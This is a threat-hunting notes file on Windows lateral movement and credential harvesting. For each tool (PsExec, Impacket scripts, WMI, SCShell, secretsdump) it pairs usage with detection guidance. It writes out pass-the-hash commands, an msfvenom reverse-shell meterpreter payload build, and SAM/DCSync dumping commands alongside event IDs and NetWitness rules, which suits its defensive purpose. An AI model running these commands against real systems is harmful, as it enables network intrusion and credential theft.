# Hunting Notes - Windows Lateral Movement and Credential Harvesting

> Paolo Coba | 04/03/2022

-------------------------------------------

# Resources
* [https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to)
* [https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/](https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/)
* [Lee Kirkpatrick's blogs on Lateral Movement](https://community.netwitness.com/t5/user/viewprofilepage/user-id/6034)
* [https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/#)
* [https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy](https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy)
* [https://u0041.co/blog/post/1](https://u0041.co/blog/post/1)
* [https://www.youtube.com/watch?v=H8ybADELHzk](https://www.youtube.com/watch?v=H8ybADELHzk)

# PsExec

## Microsoft Sysinternals Suite

Allows the execution of interactive commands over SMB using named pipes. 
* Connects to $ADMIN share
* Uploads a psexesvc.exe file. 
* Uses service control manager (sc) to start the service binary.
* Creates named pipe on destination host.
* Uses pipe for I/O operations.

### Normal usage
```cmd
PsExec.exe /accepteula \\<dest> -u <domain>\<user> -p <password> command
```

### Pass the hash
```cmd
privilege::logonpasswords
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>
PsExec.exe /accepteula \\<dest> command
```

### Detection

Detection on destination
* psexesvc.exe uploaded to target's $ADMIN share. Windows event log id 5145 created.
* Event log id 7045 for service creation.

Detection on source
* Registry value created when PsExec License Agreement is accepted.
* Prefetch for execution history.

## Impacket Toolsuite
Fails with interactive binaries such as powershell, vssadmin, plink etc. Uploads a service binary with an arbitrary name.

## Normal usage
```bash
python psexec.py user:password@<host> command
```

## Pass the hash
```bash
python psexec.py -hashes <hash> user@<host> command
```

## Manual PsExec behavior with sc

### Requirements
* Port 139,445 open on target machine.
* Password or NTLM hash.
* Write permissions on network share.
* Permission to create services on the remote machine: **SC_MANAGER_CREATE_SERVICE**
* Permission to start created service: **SERVICE_QUERY_STATUS + SERVICE_START**

### Steps
* Create exe as service
```bash
msfvenom -p windows\x64\meterpreter\reverse_http LHOST=<host> LPORT=<port> -f exe-service --platform windows -e x64\xor_dynamic -o meter64_service.exe
```
* Upload exe to network share on target machine (needs password)
```bash
smbclient \\<host>\\<share> -U <user> -c "put meter64_service.exe test.exe"
```
* Create service remotely with impacket's service.py
```bash
python services.py <DOMAIN>\<user>@<host> create -name <service name> -display <display name> -path "\\\\<host>\\<share\\test.exe"
```
* Start service remotely with impacket's service.py
```bash
python services.py <DOMAIN>\<user>@<host> start -name <service name>
```

### Detection
* Event log id 7045 for service creation.
* Suspicious executable in network share.
* Amcache and Shimcache evidence of program execution.
* Prefetch: monitors dll load to optimize future program execution. Can contain traces of execution.
* Memory Forensics:
    * Look for PsExec process:
    ```bash
    vol.py -f <image> --profile=<profile> psscan | grep PSEXE
    ```
    * Map strings with volatility:
    ```bash
    vol.py -f <image> --profile=<profile> strings -s <strings_file> > mapped_strings

    grep -i psexe mapped_strings
    ```

# PAExec

## Characteristics

Relies on SMB protocol. Copies an executable to `Admin$` and uses the Windows Service Control Manager API to start it as a service. The service uses named pipes to connect back to the tool.

A PAexec service is spawned on the target machine, running with admin privileges. Redirects input/output streams of the process execution back and forth between hosts via named pipes.

## Functionality
* Opens SMB session using supplied credentials to authenticate. If it fails to write to the `ADMIN$` share it tires to write to `IPC$` share.
* If run without any additional command line paramenters it produces an autogenerated name for the service executable (`PAExec-<PID>-<HOSTNAME>.exe`). `PID` and `Hostname` contain the pid and hostname of the source.
```cmd
paexec.exe \\<remote> -s <target executable>
```
* If run with `-noname` parameter it will name the service executable as `PAExec`.
```cmd
paexec.exe \\<remote> -noname -s <target executable>
```
* To specify custom name, use `-sname` parameter.
* Opens handle to `\\client\pipe\svcctl` to communicate with the Service Control Manger. This is for starting and stopping services remotely (Using SVCCTL protocol on top of DCE/RPC).

## Detection
* Filesystem analysis: check for presence of service executable.
* PAExec on the target machine is installed as a service. Check for Event ID 7045.
* Amcache and Shimcache evidence of program execution.
* Prefetch: monitors dll load to optimize future program execution. Can contain traces of execution.
    * Useful technique: when discovering traces of paexec, dump prefetch files for all systems in the network. Will give information of both source and destination of lateral movement.

# smbexec.py

## Characteristics

Does not upload a service binary to target. Creates a service with name **BTOBTO**. This can be changed as the tool is highly customizable (either code or parameter when running). 

## Functionality:
```
%COMSPEC% /Q /c echo <command> > \\127.0.0.1\C$\__output 2>&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
```

* %COMPSPEC%: Environment variable that points to cmd.exe
* /Q: Turns echo off.
* /c: Carries out the specified command and terminates.
* Command is echoed in a file called __output in the C$ of the local machine.
* Transfers the command in a bat file in %TEMP%/execute.bat which is then executed and deleted.
    * %TEMP%: Environment variable that points to C:\Users\<username>\AppData\Local\Temp
* 

## Usage

### Normal Usage
```bash
python smbexec.py <user>:<password>@<host>
```

### Pass the hash
```bash
python smbexec.py -hashes <hash> <user>@<host> command
```

## Detection
* Event log id 7045 for service creation

### Detection in Netwitness Packets

* Application rule for smbexec detection
```
(ioc = 'remote service control') && (analysis.service = 'windows cli admin commands') && (service = 139) && (directory = '\\C$\\','\\ADMIN$\\')
```

### Detection in Netwitness Endpoints
* Application rule for smbexec detection
```
param.dst contains '\\127.0.0.1\C$\__output'
```

* Meta to look for
 * Behaviors of Compromise:
    * services runs command shell
    * runs chained command shell

# Smbclient

## Characteristics

Tool to test connectivity to Windows shares. Can transfer, upload, backup files. Can be used with pass-the-hash.

## Normal Usage
* List shares
```bash
smbclient -L <dest> -U <user> -W <domain>
```

* Access drive
```bash
smbclient //<dest>/<share> -U <user> -W <domain>
```

## Pass the hash

```bash
smbclient //<dest>/<share> -U <user>%<hash> --pw-nt-hash
```

## Detection

# Winexe

## Characteristics

GNU/Linux based application that allows users to execute commands remotely on WindowsNT/2000/XP/2003/Vista/7/8 systems. It installs a service on the remote system, executes the command. **TODO: Determine if service is uninstalled once completed and file is deleted**.
* Connects to ADMIN$ share and uploads winexesvc.exe file.
* Uses service control manager (sc) to start the service binary (service named winexesvc).
* Creates a named pipe on the destination host and uses it for I/O operations.

## Usage
```bash
winexe -U <user>%<password> //<dest> command
```

## Detection
* Event log id 7045 for service creation. Service name winexesvc.

## Detection in NWP
* Filename metadata: Search for winexesvc.exe.
* Use analysis.service='named pipe' drill:
    * Filename metadata: svcctl. Named pipe used by Service Control Manager. Acts as RPC to control services on remote endpoints.
* Other named pipe to check for: ahexec. Used by Winexe for remote commands. Can see remote commands.
* Application rule:
```
(filename = 'ahexec','winexesvc.exe') && (service = 139)
```

## Detection in NWE
* filename.src meta: search for winexesvc.exe
* filename.dst meta: shows executables invoked.
* Application rule:
```
filename.src = 'winexesvc.exe'

(reference.id='7045') && (service.name='winexesvc')
```

# WMI

## Characteristics

Built into Windows. Allows remote access by communicating with RPC using port 135. It can be used to start a service or execute commands remotely.

## Built-In WMIC
```cmd
wmic /node:<dest> /user:<domain>\<user> /password:<password> process call create <executable>
```

## Impacket toolsuite
```bash
python wmiexec.py <user>:<password>@<dest>
python wmiexec.py -hashes <hash> <user>@<dest>
```

## Detection
* Source:
    * Event id 4648: logon with explicit credentials.
    * Event id 4688 / SysmonID 1: New process "wmic.exe" created
    * Event id 4689: Process terminated.
* Destination:
    * Local admin authentication:
        * Event IDs 4776,4672,4624 (Type 3)
    * Security 4688 / Sysmon 1: process wmiprvse.exe with child process based on executed command.

## Detection in NWP
* Indicators of Compromised meta key: look for **wmi command**
* Action meta key: executed commands
* Application rule:
```
action contains '127.0.0.1\\admin$\\__1'
```

## Detection in NWE
* Behaviors of Compromise meta key: look for **wmiprvse runs command shell**
* Application rule:
```
param.dst contains '127.0.0.1\\admin$\\__1'
```

# SCShell

## Resources
* [https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)

## Characteristics

Fileless lateral movement. The tool does not create a service or drop a file but instead uses the `ChangeServiceConfigA` function to edit an existing srevice and make it execute commands.

Only command execution using `DCE/RPC`. This makes it stealthier but more limited in functionality.

## Normal Usage
```cmd
SCShell.exe target service payload domain username password
```

## Pass-the-hash Usage

### Impacket
```bash
python scshell.py <domain>/<user>@<target> -hashes <hashes>
```

### Alternative
```cmd
sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe

Use scshell.exe in spawned cmd.exe
```

## Detection

### Detection in NWP
* `Indicators of Compromise`: `remote service control`
    * `Action Event`:
        * `startservicea`: Starts a service.
        * `queryserviceconfiga`: Retrieves the configuration parameters of the specified service.
        * `openserviceconfiga`: Opens existing service.
        * `openscmanagerw`: Establishes a connection to the service control manager on the specified system and opens the specified service control manager database.
        * `changeserviceconfiga`: Changes configuration parameters of a service.
* Application rule:
```cmd
service = 139 && filename = 'svcctl' && action = 'openservicea' && action = 'changeserviceconfiga' && action = 'startservicea'
```

### Detection in NWE
* Method 1 - Frequency analysis:
    * Query:
    ```cmd
    device.type='nwendpoint' && filename.src='services.exe' && action='createprocess'
    ```
    * Open `Filename Destination` and sort in ascending order. This allows for frequency analysis.
* `Behaviors of Compromise`:
    * `os process runs command shell`
    * `services runs command shell`

# Atexec.py

## Characteristics
Lateral movement through Windows task creation. Creates remote task, executes and then deletes it. Does not allow interactive sessions. It writes command results to a file with the same name as the task in C:\Windows\temp\<taskname>.tmp.

## Usage
```bash
python atexec.py <user>:<password>@<host> <command>
```

## Detection

* Task XML file can be found in `C:\Windows\System32\Tasks`. Check for random names.
* Windows Event Logs:
    * Microsoft-Windows-TaskScheduler/Operational:
        * Event ID 106: New task creation event. Taskname and username.
        * Event ID 110: Task triggered by user.
        * Event ID 141: Task deleted.
    * Security:
        * Event ID 4624: Logon type 3 and NTLM protocol used. 2 logins:
            * Login for task creation.
            * Login for retrieving the results.
        * Event ID 4634: Logoff with the same login ID as the login event above.
    * Microsoft-Windows-SMBServer/Security:
        * Event ID 1015: Contains the attacking IP.
* MFT Artifacts:
    * Task file in C:\Windows\system32\tasks\<taskname>
    * Results file in C:\Windows\temp\<taskname>.tmp

### Detection in NWP
* Query:
```cmd
service=139 && analysis.service='named pipe`
```
* Search in `Filename`: there must be `atsvc` to indicate that the AT-Scheduler service was used.

# RDP

## Detection

### Detection in source
* Registry `HKCU\SOFTWARE\Microsoft\Terminal Server Client`: Contains username hint when connecting to remote systems with specified account.
* Jump Lists: `C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent\(Automatic/Custom)Destinations`

### Detection in target
* `NTUSER.DAT` files for compromised accounts. `UserAssist` key gives overview on what was executed from the GUI.

# Secretsdump.py

## Characteristics

Script used to extract credentials and secrets from a system. Use-cases:
* Dump NTLM hash of local users (Remote SAM dump)
* Extract domain credentials via DCSync.

## Normal Usage
```bash
python secretsdump.py <domain>/<user>:<password>@<dest>
```

## Detection 1
* Tool enables **RemoteRegistry** service on remote endpoint. Stopped state by default.
* Security event log:
    * Event id 4624 (type 3): network logon and NTLM authentication package. Key length 0.
    * Event id 4672: special privileges assigned to logon. Check for **SeDebug or SeBackup** privileges.

## Detection 2
* Configure Security Access Control List: Change ACL to log access to the HKLM\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg registry value. Auditing permissions to everyone.
* Configure regisry access auditing in Local Security Policy -> Security Settings -> Advanced Audit Policy Configuration -> System Audit Policies - Local Group -> Object Access -> Audit Registry.

# Lsassy

## Resources
* [https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)
* [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)
